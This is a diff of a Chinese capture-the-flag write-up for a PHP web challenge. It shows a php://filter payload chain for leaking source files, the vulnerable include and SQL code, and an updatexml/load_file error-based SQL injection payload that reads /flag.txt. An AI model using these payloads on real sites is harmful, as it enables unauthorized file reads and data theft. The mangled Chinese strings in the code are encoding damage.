@@ -12,25 +12,91 @@ description: ""
 
 ```shell
 ?file=php://filter/convert.base64-encode/resource=index.php?file=php://filter/convert.base64-encode/resource=change.php?file=php://filter/convert.base64-encode/resource=confirm.php?file=php://filter/convert.base64-encode/resource=delete.php?file=php://filter/convert.base64-encode/resource=search.php
+
 ```
 
 \*\*index.php
 
 ```php
-<?phpini_set('open_basedir', '/var/www/html/');// $file = $_GET["file"];$file = (isset($_GET['file']) ? $_GET['file'] : null);if (isset($file)){    if (preg_match("/phar|zip|bzip2|zlib|data|input|%00/i",$file)) {        echo('no way!');        exit;    }    @include($file);}?>
+<?phpini_set('open_basedir', '/var/www/html/');// $file = $_GET["file"];$file = (isset($_GET['file'])
+? $_GET['file'] : null);if (isset($file)){
+    if (preg_match("/phar|zip|bzip2|zlib|data|input|%00/i",$file))
+    {
+        echo('no way!');
+        exit;
+    }
+    @include($file);}?>
 ```
 
 \*\*search.php
 
 ```php
-<?phprequire_once "config.php"; if(!empty($_POST["user_name"]) && !empty($_POST["phone"])){    $msg = '';    $pattern = '/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i';    $user_name = $_POST["user_name"];    $phone = $_POST["phone"];    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){         $msg = 'no sql inject!';    }else{        $sql = "select * from `user` where `user_name`='{$user_name}' and `phone`='{$phone}'";        $fetch = $db->query($sql);    }    if (isset($fetch) && $fetch->num_rows>0){        $row = $fetch->fetch_assoc();        if(!$row) {            echo 'error';            print_r($db->error);            exit;        }        $msg = "<p>å§å:".$row['user_name']."</p><p>, çµè¯:".$row['phone']."</p><p>, å°å:".$row['address']."</p>";    } else {        $msg = "æªæ¾å°è®¢å!";    }}else {    $msg = "ä¿¡æ¯ä¸å¨";}?>
+<?phprequire_once "config.php";
+if(!empty($_POST["user_name"])
+&& !empty($_POST["phone"])){
+    $msg = '';
+    $pattern = '/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i';
+    $user_name = $_POST["user_name"];
+    $phone = $_POST["phone"];
+    if (preg_match($pattern,$user_name)
+    || preg_match($pattern,$phone)){
+        $msg = 'no sql inject!';
+    }else{
+        $sql = "select * from `user` where `user_name`='{$user_name}' and `phone`='{$phone}'";
+        $fetch = $db->query($sql);
+    }
+    if (isset($fetch)
+    && $fetch->num_rows>0){
+        $row = $fetch->fetch_assoc();
+        if(!$row) {
+            echo 'error';
+            print_r($db->error);
+            exit;
+        }
+        $msg = "<p>å§å:".$row['user_name']."</p><p>, çµè¯:".$row['phone']."</p><p>, å°å:".$row['address']."</p>";
+    }
+    else {
+        $msg = "æªæ¾å°è®¢å!";
+    }}else {
+        $msg = "ä¿¡æ¯ä¸å¨";}?>
 ```
 
 不做其他的文件读取，只读一下change文件  
 \*\*\*change.php
 
 ```php
-<?phprequire_once "config.php";if(!empty($_POST["user_name"]) && !empty($_POST["address"]) && !empty($_POST["phone"])){    $msg = '';    $pattern = '/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i';    $user_name = $_POST["user_name"];    $address = addslashes($_POST["address"]);    $phone = $_POST["phone"];    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){        $msg = 'no sql inject!';    }else{        $sql = "select * from `user` where `user_name`='{$user_name}' and `phone`='{$phone}'";        $fetch = $db->query($sql);    }    if (isset($fetch) && $fetch->num_rows>0){        $row = $fetch->fetch_assoc();        $sql = "update `user` set `address`='".$address."', `old_address`='".$row['address']."' where `user_id`=".$row['user_id'];        $result = $db->query($sql);        if(!$result) {            echo 'error';            print_r($db->error);            exit;        }        $msg = "è®¢åä¿®æ¹æå";    } else {        $msg = "æªæ¾å°è®¢å!";    }}else {    $msg = "ä¿¡æ¯ä¸å¨";}?>
+<?phprequire_once "config.php";if(!empty($_POST["user_name"])
+&& !empty($_POST["address"])
+&& !empty($_POST["phone"])){
+    $msg = '';
+    $pattern = '/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i';
+    $user_name = $_POST["user_name"];
+    $address = addslashes($_POST["address"]);
+    $phone = $_POST["phone"];
+    if (preg_match($pattern,$user_name)
+    || preg_match($pattern,$phone)){
+        $msg = 'no sql inject!';
+    }else{
+        $sql = "select * from `user` where `user_name`='{$user_name}' and `phone`='{$phone}'";
+        $fetch = $db->query($sql);
+    }
+    if (isset($fetch)
+    && $fetch->num_rows>0){
+        $row = $fetch->fetch_assoc();
+        $sql = "update `user` set `address`='".$address."', `old_address`='".$row['address']."' where `user_id`=".$row['user_id'];
+        $result = $db->query($sql);
+        if(!$result)
+        {
+            echo 'error';
+            print_r($db->error);
+            exit;
+        }
+        $msg = "è®¢åä¿®æ¹æå";
+    }
+    else {
+        $msg = "æªæ¾å°è®¢å!";
+    }}else {
+        $msg = "ä¿¡æ¯ä¸å¨";}?>
 ```
 
 看一下gpt的解释对应的数据库查询结果  
@@ -69,6 +135,7 @@ payload
 
 ```sql
 1' where user_id=updatexml(1,concat(0x7e,(select substr(load_file('/flag.txt'),1,30)),0x7e),1)#1' where user_id=updatexml(1,concat(0x7e,(select substr(load_file('/flag.txt'),30,60)),0x7e),1)#
+
 ```
 
 ![image.png](https://raw.githubusercontent.com/k1t0111/blog/main/image/20240911204627.png)  
